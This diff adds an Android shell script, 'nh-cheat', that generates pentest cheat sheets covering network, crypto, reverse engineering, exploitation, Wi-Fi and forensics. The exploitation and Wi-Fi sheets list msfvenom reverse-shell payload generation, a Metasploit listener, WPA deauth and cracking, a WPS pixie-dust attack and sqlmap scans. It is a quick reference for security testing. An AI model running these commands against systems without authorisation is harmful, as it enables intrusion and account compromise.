@@ -1,0 +1,280 @@
+#!/system/bin/sh
+# NH_SETUP_VERSION: 2.0 nextgen
+# PRIORITY: P1
+# nh-cheat - Cheat sheet generator and quick reference
+set -u
+
+NHSYSTEM=/data/local/nhsystem
+CHEAT_DIR=$NHSYSTEM/etc/cheats
+NHWORK=$NHSYSTEM/workspaces/main
+
+ensure_cheats() {
+    mkdir -p "$CHEAT_DIR"
+    if [ ! -f "$CHEAT_DIR/.initialized" ]; then
+
+        cat > "$CHEAT_DIR/network.txt" <<'CHEAT'
+╔══ Network Cheats ══╗
+
+SCANNING:
+  nh-scan subnet          Scan local subnet
+  nh-scan 192.168.1.100   Scan single host
+  nmap -sV 192.168.1.1    Version scan
+  nmap -sS 192.168.1.0/24 Stealth scan
+
+CAPTURE:
+  nh-sniff start wlan0           Start capture
+  nh-sniff start wlan0 -p 80    HTTP capture
+  nh-sniff stop                  Stop capture
+  nh-sniff analyze capture.pcap  Analyze pcap
+
+WIRELESS (requires custom kernel):
+  airodump-ng wlan0     Monitor mode scan
+  aircrack-ng capture   Crack WEP/WPA
+  aireplay-ng           Packet injection
+
+TUNNELING:
+  nh-tunnel create local:8080 remote:80
+  ssh -L 8080:localhost:80 user@host
+  ssh -D 1080 user@host     SOCKS proxy
+
+DNS:
+  nh-dns status         Check DNS
+  dig example.com       Query DNS
+  nslookup example.com
+CHEAT
+
+        cat > "$CHEAT_DIR/crypto.txt" <<'CHEAT'
+╔══ Crypto & Hash Cheats ══╗
+
+HASH CRACKING:
+  nh-crack identify hash.txt      Identify hash type
+  nh-crack hashcat hash.txt       Crack with hashcat
+  nh-crack john hash.txt          Crack with john
+  nh-crack wordlist list          List wordlists
+  nh-crack wordlist fetch rockyou Download rockyou
+
+HASH EXAMPLES:
+  MD5:       $1$xxxxxxxx
+  SHA256:    $5$xxxxxxxx
+  SHA512:    $6$xxxxxxxx
+  bcrypt:    $2a$xx$xxxxxxxx
+  NTLM:      32 hex chars
+
+GENERATION:
+  openssl passwd -6 secret       SHA512 crypt
+  openssl rand -base64 32        Random token
+  python3 -c "import secrets; print(secrets.token_hex(32))"
+
+VERIFICATION:
+  sha256sum file.txt
+  md5sum file.txt
+  gpg --verify file.sig file
+CHEAT
+
+        cat > "$CHEAT_DIR/reverse.txt" <<'CHEAT'
+╔══ Reverse Engineering Cheats ══╗
+
+FRIDA:
+  frida-ps -U                    List processes
+  frida-trace -U -i open com.app  Trace functions
+  frida -U com.app -l script.js  Run script
+  objection -g com.app explore   Objection runtime
+
+DYNAMIC ANALYSIS:
+  nh-magisk fetch frida          Install MagiskFrida
+  frida-server starts on boot    After MagiskFrida
+
+STATIC ANALYSIS:
+  apktool d app.apk              Decompile APK
+  jadx-gui app.apk               Java decompiler
+  strings app.apk | grep -i password
+
+CERT PINNING BYPASS:
+  nh-market install always-trust-user-certs
+  Install cert -> Settings -> Trusted credentials
+  Reboot -> cert in system store
+
+NETWORK MITM:
+  nh-secure certs                Setup cert trust
+  Burp Suite proxy on :8080
+  Proxy config -> Android WiFi settings
+CHEAT
+
+        cat > "$CHEAT_DIR/exploit.txt" <<'CHEAT'
+╔══ Exploitation Cheats ══╗
+
+METASPLOIT:
+  msfconsole                    Start Metasploit
+  use exploit/multi/handler     Setup listener
+  set PAYLOAD android/meterpreter/reverse_tcp
+  set LHOST <ip>
+  set LPORT 4444
+  exploit -j
+
+PAYLOAD GENERATION:
+  msfvenom -p android/meterpreter/reverse_tcp \
+    LHOST=<ip> LPORT=4444 -o payload.apk
+  msfvenom -p linux/aarch64/meterpreter/reverse_tcp \
+    LHOST=<ip> LPORT=4444 -f elf -o payload.elf
+
+SEARCHSPLOIT:
+  searchsploit apache 2.4       Search exploits
+  searchsploit -p 12345         Show exploit details
+  searchsploit -m 12345         Mirror exploit
+
+WEB:
+  sqlmap -u http://target.com/page?id=1
+  nikto -h http://target.com
+  gobuster dir -u http://target.com -w wordlist.txt
+  whatweb http://target.com
+CHEAT
+
+        cat > "$CHEAT_DIR/system.txt" <<'CHEAT'
+╔══ System & Admin Cheats ══╗
+
+PROCESSES:
+  ps aux                         All processes
+  top                            Live processes
+  htop                           Enhanced top
+  nh-proc                        Process overview
+
+STORAGE:
+  df -h                          Disk usage
+  du -sh *                       Directory sizes
+  ncdu                           Interactive NCurses disk usage
+
+SERVICES:
+  nh-services start              Start all services
+  nh-health                      System health
+  nh-status                      Status dashboard
+  systemctl (in chroot)          Service management
+
+NETWORK:
+  ip a                           Interfaces
+  ip route                       Routing table
+  ss -tlnp                       Listening ports
+  ss -tunap                      All connections
+
+CHROOT:
+  nh-enter-arch                  Enter Arch
+  nh-enter-kali                  Enter Kali
+  nh-mount arch                  Mount Arch
+  nh-umount                      Unmount all
+
+DEVELOPMENT:
+  nh-init python myproject       Create Python project
+  nh-init rust myapp             Create Rust project
+  nh-init c mytool               Create C project
+  nh-init shell myscript         Create shell project
+CHEAT
+
+        cat > "$CHEAT_DIR/wifi.txt" <<'CHEAT'
+╔══ Wireless Cheats ══╗
+
+MONITOR MODE (requires kernel support):
+  iw dev wlan0 set monitor none  Enable monitor
+  airmon-ng start wlan0          Aircrack helper
+  iwconfig                       Check mode
+
+WPA HANDSHAKE CAPTURE:
+  airodump-ng wlan0              Find targets
+  airodump-ng -c 6 --bssid <MAC> -w capture wlan0
+  aireplay-ng -0 2 -a <MAC> wlan0  Deauth client
+
+WPA CRACK:
+  aircrack-ng -w wordlist.txt capture-01.cap
+
+WPS:
+  oneshot -i wlan0 -b <MAC>     Pixie dust attack
+  wash -i wlan0                  Scan WPS networks
+
+WARDRIVING:
+  nh-scan subnet                 Quick scan
+  gpsd + kismet                  Wardriving setup
+
+BLUETOOTH:
+  bluetoothctl                   Interactive BT control
+  hcitool scan                   Discover devices
+  l2ping -c 10 <MAC>             L2CAP ping
+CHEAT
+
+        cat > "$CHEAT_DIR/forensic.txt" <<'CHEAT'
+╔══ Forensics Cheats ══╗
+
+FILE ANALYSIS:
+  file <target>                  Identify file type
+  binwalk <firmware>             Extract firmware
+  strings <file> | head -50      Extract strings
+  xxd <file> | head -20          Hex dump
+
+MEMORY:
+  volatility -f mem.dump imageinfo
+  volatility -f mem.dump --profile=Win10 pslist
+  volatility -f mem.dump --profile=Win10 netscan
+
+LOG ANALYSIS:
+  nh-log                         System logs
+  journalctl -u sshd             SSH logs (in chroot)
+  grep "Failed password" /var/log/auth.log
+
+TIMELINE:
+  ls -la --time=atime            Access times
+  stat <file>                    Full timestamps
+  find . -mmin -60               Modified last hour
+
+RECOVERY:
+  foremost -i image.dd -o output File carving
+  scalpel -c scalpel.conf image.dd
+  photorec /dev/block/loop0      Photo recovery
+CHEAT
+
+        touch "$CHEAT_DIR/.initialized"
+    fi
+}
+
+list_cheats() {
+    ensure_cheats
+    echo "── Cheat Sheets ──"
+    echo ""
+    for f in "$CHEAT_DIR"/*.txt; do
+        [ -f "$f" ] || continue
+        local name=$(basename "$f" .txt)
+        local lines=$(wc -l < "$f")
+        printf "  %-20s %d commands\n" "$name" "$((lines - 3))"
+    done
+    echo ""
+    echo "Usage: nh-cheat <topic>"
+    echo "Topics: network, crypto, reverse, exploit, system, wifi, forensic"
+}
+
+show_cheat() {
+    local topic="$1"
+    local file="$CHEAT_DIR/$topic.txt"
+    [ -f "$file" ] || { echo "Cheat sheet not found: $topic"; echo "Available: network crypto reverse exploit system wifi forensic"; exit 1; }
+    cat "$file"
+}
+
+usage() {
+    cat <<EOF
+nh-cheat - Cheat sheet generator
+
+Usage: nh-cheat <topic>
+
+Topics:
+  network    Scanning, capture, tunneling, DNS
+  crypto     Hash cracking, generation, verification
+  reverse    Frida, APK analysis, MITM, certs
+  exploit    Metasploit, payloads, searchsploit, web
+  system     Processes, storage, services, chroot, dev
+  wifi       Monitor mode, WPA, WPS, BT, wardriving
+  forensic   File analysis, memory, logs, recovery
+EOF
+    exit 1
+}
+
+ensure_cheats
+[ $# -ge 1 ] || usage
+case "$1" in
+    list|ls) list_cheats ;;
+    *) show_cheat "$1" ;;
+esac
